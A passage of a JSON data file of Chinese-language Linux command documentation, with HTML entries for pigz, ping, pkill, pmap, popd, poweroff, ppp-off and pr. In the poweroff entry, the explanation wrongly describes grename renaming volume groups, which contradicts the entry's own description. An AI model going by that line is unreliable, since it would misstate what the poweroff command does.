class=\"hljs-comment\"># All arguments after \"--\" are treated as files</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>可以结合<code>tar</code>使用, 压缩命令</p>\n<pre><code class=\"language-shell\">tar -cvf - <span class=\"hljs-keyword\">dir1 </span><span class=\"hljs-keyword\">dir2 </span><span class=\"hljs-keyword\">dir3 </span><span class=\"hljs-title\">| pigz -p 8 &gt; output.tgz</span>\n</code></pre>\n<p>解压命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">pigz</span> -p <span class=\"hljs-number\">8</span> -d output.tgz\n</code></pre>\n<p>如果是gzip格式，也支持用tar解压</p>\n<pre><code class=\"language-shell\">tar -xzvf <span class=\"hljs-built_in\">output</span>.tgz\n</code></pre>\n"
    },
    {
        "title": "ping",
        "des": "测试主机之间网络的连通性",
        "body": "<h1 id=\"ping\">ping</h1>\n<p>测试主机之间网络的连通性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ping命令</strong> 用来测试主机之间网络的连通性。执行ping指令会使用ICMP传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ping</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：使用Socket的SO_DEBUG功能；</span>\n<span class=\"hljs-deletion\">-c&lt;完成次数&gt;：设置完成要求回应的次数；</span>\n<span class=\"hljs-deletion\">-f：极限检测；</span>\n<span class=\"hljs-deletion\">-i&lt;间隔秒数&gt;：指定收发信息的间隔时间；</span>\n<span class=\"hljs-deletion\">-I&lt;网络界面&gt;：使用指定的网络界面送出数据包；</span>\n<span class=\"hljs-deletion\">-l&lt;前置载入&gt;：设置在送出要求信息之前，先行发出的数据包；</span>\n<span class=\"hljs-deletion\">-n：只输出数值；</span>\n<span class=\"hljs-deletion\">-p&lt;范本样式&gt;：设置填满数据包的范本样式；</span>\n<span class=\"hljs-deletion\">-q：不显示指令执行过程，开头和结尾的相关信息除外；</span>\n<span class=\"hljs-deletion\">-r：忽略普通的Routing Table，直接将数据包送到远端主机上；</span>\n<span class=\"hljs-deletion\">-R：记录路由过程；</span>\n<span class=\"hljs-deletion\">-s&lt;数据包大小&gt;：设置数据包的大小；</span>\n<span class=\"hljs-deletion\">-t&lt;存活数值&gt;：设置存活数值TTL的大小；</span>\n<span class=\"hljs-deletion\">-v：详细显示指令的执行过程。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目的主机：指定发送ICMP报文的目的主机。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@AY1307311912260196fcZ ~]#<span class=\"hljs-built_in\"> ping </span>www.jsdig.com<span class=\"hljs-built_in\">\nPING </span>host.1.jsdig.com (100.42.212.8) 56(84) bytes of data.\n64 bytes <span class=\"hljs-keyword\">from</span> 100-42-212-8.static.webnx.com (100.42.212.8): <span class=\"hljs-attribute\">icmp_seq</span>=1 <span class=\"hljs-attribute\">ttl</span>=50 <span class=\"hljs-attribute\">time</span>=177 ms\n64 bytes <span class=\"hljs-keyword\">from</span> 100-42-212-8.static.webnx.com (100.42.212.8): <span class=\"hljs-attribute\">icmp_seq</span>=2 <span class=\"hljs-attribute\">ttl</span>=50 <span class=\"hljs-attribute\">time</span>=178 ms\n64 bytes <span class=\"hljs-keyword\">from</span> 100-42-212-8.static.webnx.com (100.42.212.8): <span class=\"hljs-attribute\">icmp_seq</span>=3 <span class=\"hljs-attribute\">ttl</span>=50 <span class=\"hljs-attribute\">time</span>=174 ms\n64 bytes <span class=\"hljs-keyword\">from</span> 100-42-212-8.static.webnx.com (100.42.212.8): <span class=\"hljs-attribute\">icmp_seq</span>=4 <span class=\"hljs-attribute\">ttl</span>=50 <span class=\"hljs-attribute\">time</span>=177 ms\n<span class=\"hljs-built_in\">..</span>.按Ctrl+C结束\n\n--- host.1.jsdig.com<span class=\"hljs-built_in\"> ping </span>statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 2998ms\nrtt min/avg/max/mdev = 174.068/176.916/178.182/1.683 ms\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pkill",
        "des": "可以按照进程名杀死进程",
        "body": "<h1 id=\"pkill\">pkill</h1>\n<p>可以按照进程名杀死进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pkill命令</strong> 可以按照进程名杀死进程。pkill和killall应用方法差不多，也是直接杀死运行中的程序；如果您想杀掉单个进程，请用kill来杀掉。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pkill</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-o：仅向找到的最小（起始）进程号发送信号；</span>\n<span class=\"hljs-deletion\">-n：仅向找到的最大（结束）进程号发送信号；</span>\n<span class=\"hljs-deletion\">-P：指定父进程号发送信号；</span>\n<span class=\"hljs-deletion\">-g：指定进程组；</span>\n<span class=\"hljs-deletion\">-t：指定开启进程的终端。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>进程名称：指定要查找的进程名称，同时也支持类似grep指令中的匹配模式。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">pgrep</span> -l gaim\n<span class=\"hljs-number\">2979</span> gaim\n\npkill gaim\n</code></pre>\n<p>也就是说：kill对应的是PID，pkill对应的是command。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pmap",
        "des": "报告进程的内存映射关系",
        "body": "<h1 id=\"pmap\">pmap</h1>\n<p>报告进程的内存映射关系</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pmap命令</strong> 用于报告进程的内存映射关系，是Linux调试及运维一个很好的工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pmap</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-x：显示扩展格式；</span>\n<span class=\"hljs-deletion\">-d：显示设备格式；</span>\n<span class=\"hljs-deletion\">-q：不显示头尾行；</span>\n<span class=\"hljs-deletion\">-V：显示指定版本。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>进程号：指定需要显示内存映射关系的进程号，可以是多个进程号。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">pidof nginx\n13312 5371\n\npmap -x 5371\n5371:   nginx: worker process                \nAddress           Kbytes     RSS   Dirty Mode   Mapping\n0000000000400000    <span class=\"hljs-number\"> 564 </span>   <span class=\"hljs-number\"> 344 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  nginx\n000000000068c000     <span class=\"hljs-number\"> 68 </span>    <span class=\"hljs-number\"> 68 </span>    <span class=\"hljs-number\"> 60 </span>rw---  nginx\n000000000069d000     <span class=\"hljs-number\"> 56 </span>    <span class=\"hljs-number\"> 12 </span>    <span class=\"hljs-number\"> 12 </span>rw---    [ anon ]\n000000000a0c8000   <span class=\"hljs-number\"> 1812 </span>  <span class=\"hljs-number\"> 1684 </span>  <span class=\"hljs-number\"> 1684 </span>rw---    [ anon ]\n0000003ac0a00000    <span class=\"hljs-number\"> 112 </span>    <span class=\"hljs-number\"> 40 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  ld-2.5.so\n0000003ac0c1c000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>r----  ld-2.5.so\n0000003ac0c1d000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  ld-2.5.so\n0000003ac0e00000   <span class=\"hljs-number\"> 1340 </span>   <span class=\"hljs-number\"> 284 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libc-2.5.so\n0000003ac0f4f000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libc-2.5.so\n0000003ac114e000     <span class=\"hljs-number\"> 16 </span>    <span class=\"hljs-number\"> 16 </span>     <span class=\"hljs-number\"> 8 </span>r----  libc-2.5.so\n0000003ac1152000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libc-2.5.so\n0000003ac1153000     <span class=\"hljs-number\"> 20 </span>    <span class=\"hljs-number\"> 20 </span>    <span class=\"hljs-number\"> 20 </span>rw---    [ anon ]\n0000003ac1200000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libdl-2.5.so\n0000003ac1202000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libdl-2.5.so\n0000003ac1402000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>r----  libdl-2.5.so\n0000003ac1403000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libdl-2.5.so\n0000003ac1600000     <span class=\"hljs-number\"> 84 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libselinux.so.1\n0000003ac1615000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libselinux.so.1\n0000003ac1815000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>rw---  libselinux.so.1\n0000003ac1817000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---    [ anon ]\n0000003ac1a00000    <span class=\"hljs-number\"> 236 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libsepol.so.1\n0000003ac1a3b000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libsepol.so.1\n0000003ac1c3b000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libsepol.so.1\n0000003ac1c3c000     <span class=\"hljs-number\"> 40 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>rw---    [ anon ]\n0000003ac1e00000     <span class=\"hljs-number\"> 88 </span>    <span class=\"hljs-number\"> 44 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libpthread-2.5.so\n0000003ac1e16000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libpthread-2.5.so\n0000003ac2016000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>r----  libpthread-2.5.so\n0000003ac2017000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libpthread-2.5.so\n0000003ac2018000     <span class=\"hljs-number\"> 16 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---    [ anon ]\n0000003ac2600000     <span class=\"hljs-number\"> 80 </span>    <span class=\"hljs-number\"> 52 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libz.so.1.2.3\n0000003ac2614000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libz.so.1.2.3\n0000003ac2813000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libz.so.1.2.3\n0000003ac2a00000     <span class=\"hljs-number\"> 36 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libcrypt-2.5.so\n0000003ac2a09000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libcrypt-2.5.so\n0000003ac2c08000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>r----  libcrypt-2.5.so\n0000003ac2c09000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libcrypt-2.5.so\n0000003ac2c0a000    <span class=\"hljs-number\"> 184 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>rw---    [ anon ]\n0000003ac3600000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libkeyutils-1.2.so\n0000003ac3602000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libkeyutils-1.2.so\n0000003ac3801000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libkeyutils-1.2.so\n0000003ac3a00000     <span class=\"hljs-number\"> 68 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libresolv-2.5.so\n0000003ac3a11000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libresolv-2.5.so\n0000003ac3c11000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>r----  libresolv-2.5.so\n0000003ac3c12000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libresolv-2.5.so\n0000003ac3c13000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>rw---    [ anon ]\n0000003ac3e00000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libcom_err.so.2.1\n0000003ac3e02000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libcom_err.so.2.1\n0000003ac4001000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libcom_err.so.2.1\n0000003ac4200000   <span class=\"hljs-number\"> 1204 </span>     <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libcrypto.so.0.9.8e\n0000003ac432d000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libcrypto.so.0.9.8e\n0000003ac452c000    <span class=\"hljs-number\"> 132 </span>    <span class=\"hljs-number\"> 88 </span>    <span class=\"hljs-number\"> 12 </span>rw---  libcrypto.so.0.9.8e\n0000003ac454d000     <span class=\"hljs-number\"> 16 </span>    <span class=\"hljs-number\"> 12 </span>    <span class=\"hljs-number\"> 12 </span>rw---    [ anon ]\n0000003ac4600000    <span class=\"hljs-number\"> 176 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libgssapi_krb5.so.2.2\n0000003ac462c000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libgssapi_krb5.so.2.2\n0000003ac482c000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>rw---  libgssapi_krb5.so.2.2\n0000003ac4a00000    <span class=\"hljs-number\"> 144 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libk5crypto.so.3.1\n0000003ac4a24000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libk5crypto.so.3.1\n0000003ac4c23000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>rw---  libk5crypto.so.3.1\n0000003ac4e00000     <span class=\"hljs-number\"> 32 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libkrb5support.so.0.1\n0000003ac4e08000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libkrb5support.so.0.1\n0000003ac5007000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libkrb5support.so.0.1\n0000003ac5200000    <span class=\"hljs-number\"> 580 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libkrb5.so.3.3\n0000003ac5291000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libkrb5.so.3.3\n0000003ac5491000     <span class=\"hljs-number\"> 16 </span>    <span class=\"hljs-number\"> 16 </span>    <span class=\"hljs-number\"> 12 </span>rw---  libkrb5.so.3.3\n0000003ac5a00000    <span class=\"hljs-number\"> 288 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libssl.so.0.9.8e\n0000003ac5a48000   <span class=\"hljs-number\"> 2048 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libssl.so.0.9.8e\n0000003ac5c48000     <span class=\"hljs-number\"> 24 </span>    <span class=\"hljs-number\"> 16 </span>    <span class=\"hljs-number\"> 12 </span>rw---  libssl.so.0.9.8e\n00002b5751808000      <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>     <span class=\"hljs-number\"> 8 </span>rw---    [ anon ]\n00002b5751810000    <span class=\"hljs-number\"> 108 </span>    <span class=\"hljs-number\"> 36 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libpcre.so.1.2.0\n00002b575182b000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libpcre.so.1.2.0\n00002b5751a2a000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libpcre.so.1.2.0\n00002b5751a2b000     <span class=\"hljs-number\"> 28 </span>    <span class=\"hljs-number\"> 28 </span>    <span class=\"hljs-number\"> 28 </span>rw---    [ anon ]\n00002b5751a32000     <span class=\"hljs-number\"> 40 </span>    <span class=\"hljs-number\"> 20 </span>     <span class=\"hljs-number\"> 0 </span>r-x--  libnss_files-2.5.so\n00002b5751a3c000   <span class=\"hljs-number\"> 2044 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----  libnss_files-2.5.so\n00002b5751c3b000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>r----  libnss_files-2.5.so\n00002b5751c3c000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw---  libnss_files-2.5.so\n00002b5751c3d000      <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>     <span class=\"hljs-number\"> 4 </span>rw-s-  zero (deleted)\n00002b5751c3e000  <span class=\"hljs-number\"> 20012 </span> <span class=\"hljs-number\"> 20000 </span> <span class=\"hljs-number\"> 20000 </span>rw---    [ anon ]\n00007fffbf2ce000     <span class=\"hljs-number\"> 84 </span>    <span class=\"hljs-number\"> 20 </span>    <span class=\"hljs-number\"> 20 </span>rw---    [ stack ]\n00007fffbf35e000     <span class=\"hljs-number\"> 12 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>r-x--    [ anon ]\nffffffffff600000   <span class=\"hljs-number\"> 8192 </span>     <span class=\"hljs-number\"> 0 </span>     <span class=\"hljs-number\"> 0 </span>-----    [ anon ]\n----------------  ------  ------  ---<span class=\"language-yaml\"><span class=\"hljs-meta\">---</span>\n<span class=\"hljs-string\">total</span> <span class=\"hljs-string\">kB</span>           <span class=\"hljs-number\">72880</span>   <span class=\"hljs-number\">22940</span>   <span class=\"hljs-number\">22000</span></span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "popd",
        "des": "从目录堆栈中删除目录。",
        "body": "<h1 id=\"popd\">popd</h1>\n<p>从目录堆栈中删除目录。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">popd [-<span class=\"hljs-built_in\">n</span>] [+<span class=\"hljs-built_in\">N</span> | -<span class=\"hljs-built_in\">N</span>]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>从目录堆栈中删除目录，如果是顶部目录被删除，那么当前工作目录会切换到新的顶部目录。</p>\n</li>\n<li><p>没有参数时，删除目录堆栈顶部。</p>\n</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n    抑制删除目录引起的当前工作目录变化。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>+N（可选）：不带参数执行<code>dirs</code>命令显示的列表中，左起的第N个目录将被删除。（从0开始计数）</p>\n<p>-N（可选）：不带参数执行<code>dirs</code>命令显示的列表中，右起的第N个目录将被删除。（从0开始计数）</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非提供了非法选项或执行出现错误。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加目录到堆栈，当前工作目录不变。</span>\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> ~]<span class=\"hljs-variable\">$</span> dirs\n~\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> ~]<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">pushd</span> <span class=\"hljs-literal\">-n</span> ~/Desktop\n~ ~/Desktop\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> ~]<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">pushd</span> <span class=\"hljs-literal\">-n</span> ~/Pictures\n~ ~/Pictures ~/Desktop\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> ~]<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">pushd</span> <span class=\"hljs-literal\">-n</span> ~/bin\n~ ~/bin ~/Pictures ~/Desktop\n\n<span class=\"hljs-comment\"># 从目录堆栈中删除目录，删除顶部目录时会改变当前工作目录：</span>\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> ~]<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">popd</span> <span class=\"hljs-literal\">-2</span>\n~ ~/Pictures ~/Desktop\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> ~]<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">popd</span> +<span class=\"hljs-number\">1</span>\n~ ~/Desktop\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> ~]<span class=\"hljs-variable\">$</span> <span class=\"hljs-built_in\">popd</span>\n~/Desktop\n[<span class=\"hljs-type\">user2</span>@<span class=\"hljs-type\">pc</span> <span class=\"hljs-type\">Desktop</span>]<span class=\"hljs-variable\">$</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 从目录堆栈中删除目录，删除顶部目录时不会改变当前工作目录：</span>\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>dirs\n~\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>pushd -n ~<span class=\"hljs-regexp\">/Desktop\n~ ~/</span>Desktop\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>popd -n\n~\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的目录堆栈命令包括<code>dirs popd pushd</code>。</li>\n<li>当前目录始终是目录堆栈的顶部。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<h3 id=\"参考链接\">参考链接</h3>\n<ul>\n<li><a href=\"https://superuser.com/questions/784450/popd-and-pushd-behavior-with-n-option\">popd、pushd命令'-n'选项的行为</a></li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "poweroff",
        "des": "关闭Linux系统，关闭记录会被写入到/var/log/wtmp日志文件中",
        "body": "<h1 id=\"poweroff\">poweroff</h1>\n<p>关闭Linux系统，关闭记录会被写入到/var/log/wtmp日志文件中</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grename命令</strong> 可以重命名卷组的名称。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">poweroff</span><span class=\"hljs-meta\"> [选项]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n 关闭之前不同步</span>\n<span class=\"hljs-deletion\">-p 当被称为halt时关闭电源</span>\n<span class=\"hljs-deletion\">-v 增加输出，包括消息</span>\n<span class=\"hljs-deletion\">-q 降低输出错误唯一的消息</span>\n<span class=\"hljs-deletion\">-w 并不实际关闭系统，只是写入/var/log/wtmp文件中</span>\n<span class=\"hljs-deletion\">-f 强制关机，不调用shutdown</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>关闭Linux系统。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># poweroff</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ppp-off",
        "des": "关闭ppp连线",
        "body": "<h1 id=\"ppp-off\">ppp-off</h1>\n<p>关闭ppp连线</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p>这是Slackware发行版内附的程序，让用户切断PPP的网络连线。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ppp</span>-<span class=\"hljs-literal\">off</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pr",
        "des": "将文本文件转换成适合打印的格式",
        "body": "<h1 id=\"pr\">pr</h1>\n<p>将文本文件转换成适合打印的格式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pr命令</strong> 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pr</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-h<span class=\"hljs-attribute\">&lt;标题&gt;</span>：为页指定标题；\n-l<span class=\"hljs-attribute\">&lt;行数&gt;</span>：指定每页的行数。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：需要转换格式的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "printf",
        "des": "格式化并输出结果。",
